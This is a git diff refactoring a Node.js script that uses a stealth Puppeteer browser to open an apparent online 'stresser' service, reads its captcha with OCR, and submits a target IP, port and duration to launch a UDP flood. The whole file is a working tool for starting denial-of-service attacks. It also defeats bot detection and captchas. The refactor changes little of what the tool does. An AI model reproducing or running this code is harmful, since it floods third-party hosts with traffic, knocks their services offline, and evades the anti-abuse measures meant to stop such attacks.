@@ -1,20 +1,23 @@
-//Dependencies
-const Puppeteer_Stealth = require("puppeteer-extra-plugin-stealth")
+"use strict";
+
+// Dependencies
+const puppeteerStealth = require("puppeteer-extra-plugin-stealth")
 const { PythonShell } = require("python-shell")
-const Puppeteer = require("puppeteer-extra")
-const Is_IP = require("is-ip")
+const puppeteer = require("puppeteer-extra")
+const isIP = require("is-ip")
 
-//Variables
-const Self_Args = process.argv.slice(2)
+// Variables
+const args = process.argv.slice(2)
 
-var Self = {}
+var FSWCBypasser = {}
 
-//Configurations
-Puppeteer.default.use(Puppeteer_Stealth())
+// Configurations
+/// Puppeteer
+puppeteer.default.use(puppeteerStealth())
 
-//Functions
-Self.captcha_bypasser = async function(){
-    return new Promise(resolve =>{
+// Functions
+FSWCBypasser.bypassCaptcha = async function(){
+    return new Promise((resolve) =>{
         PythonShell.run("./utils/image_reader.py", null, function(err, result){
             if(err){
                 console.log(`Python error detected: ${err}`)
@@ -28,7 +31,7 @@ Self.captcha_bypasser = async function(){
     })
 }
 
-Self.remove_advertisement = async function(page){
+FSWCBypasser.removeAdvertisement = async function(page){
     await page.waitForSelector("#ads > div > div > div.modal-header > button").catch(()=>{
         return
     })
@@ -44,8 +47,8 @@ Self.remove_advertisement = async function(page){
     })
 }
 
-Self.main = async function(){
-    const browser = await Puppeteer.default.launch({ headless: false, argv: ["--no-sandbox", "--disable-setuid-sandbox"] })
+FSWCBypasser.main = async function(){
+    const browser = await puppeteer.default.launch({ headless: false, argv: ["--no-sandbox", "--disable-setuid-sandbox"] })
     const page = await browser.newPage()
     
     await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
@@ -65,7 +68,7 @@ Self.main = async function(){
     }
 
     console.log("[Processing] Checking & closing any advertisements.")
-    await Self.remove_advertisement(page)
+    await FSWCBypasser.removeAdvertisement(page)
     console.log("[Finished] Checking & closing any advertisements")
 
     await page.screenshot({
@@ -79,7 +82,7 @@ Self.main = async function(){
     })
 
     console.log("[Processing] Reading the captcha codes, for bypassing.")
-    var code = await Self.captcha_bypasser()
+    var code = await FSWCBypasser.bypassCaptcha()
     console.log("[Finished] Reading the captcha codes, for bypassing.")
 
     if(!code.match(/[0-9]{4,}/)){
@@ -92,9 +95,9 @@ Self.main = async function(){
 
     console.log(`Captcha code found ${code}`)
 
-    await page.type("#host", Self_Args[0])
-    await page.type("#port", Self_Args[1])
-    await page.type("#time", Self_Args[2])
+    await page.type("#host", args[0])
+    await page.type("#port", args[1])
+    await page.type("#time", args[2])
     await page.type("#captcha", code)
     await page.click("#send")
 
@@ -108,7 +111,7 @@ Self.main = async function(){
         }
 
         if(page_content.indexOf("Operation Successful UDP was sent to") != -1){
-            console.log(`Stressing to ${Self_Args[0]} has started and will end in ${Self_Args[2]} seconds.`)
+            console.log(`Stressing to ${args[0]} has started and will end in ${args[2]} seconds.`)
             await browser.close()
             process.exit()
         }
@@ -130,44 +133,11 @@ Self.main = async function(){
 }
 
 //Main
-if(!Self_Args.length){
-    console.log("node index.js <ip> <port> <seconds>")
-    process.exit()
-}
+if(!args.length) return console.log("node index.js <ip> <port> <seconds>")
+if(!args[0]) return console.log("Invalid ip.")
+if(!isIP(args[0])) return console.log("Invalid ip.")
+if(!args[1]) return console.log("Invalid port.")
+if(!args[2]) return console.log("Invalid seconds.")
+if(args[2] > 60) return console.log("Invalid seconds, maximum is 60.")
 
-if(!Self_Args[0]){
-    console.log("Invalid ip.")
-    process.exit()
-}
-
-if(!Is_IP(Self_Args[0])){
-    console.log("Invalid ip.")
-    process.exit()
-}
-
-if(!Self_Args[1]){
-    console.log("Invalid port.")
-    process.exit()
-}
-
-if(isNaN(Self_Args[1])){
-    console.log("Invalid port, port is not an Int.")
-    process.exit()
-}
-
-if(!Self_Args[2]){
-    console.log("Invalid seconds.")
-    process.exit()
-}
-
-if(isNaN(Self_Args[2])){
-    console.log("Invalid seconds, seconds is not an Int.")
-    process.exit()
-}
-
-if(Self_Args[2] > 60){
-    console.log("Invalid seconds, maximum is 60.")
-    process.exit()
-}
-
-Self.main()
+FSWCBypasser.main()
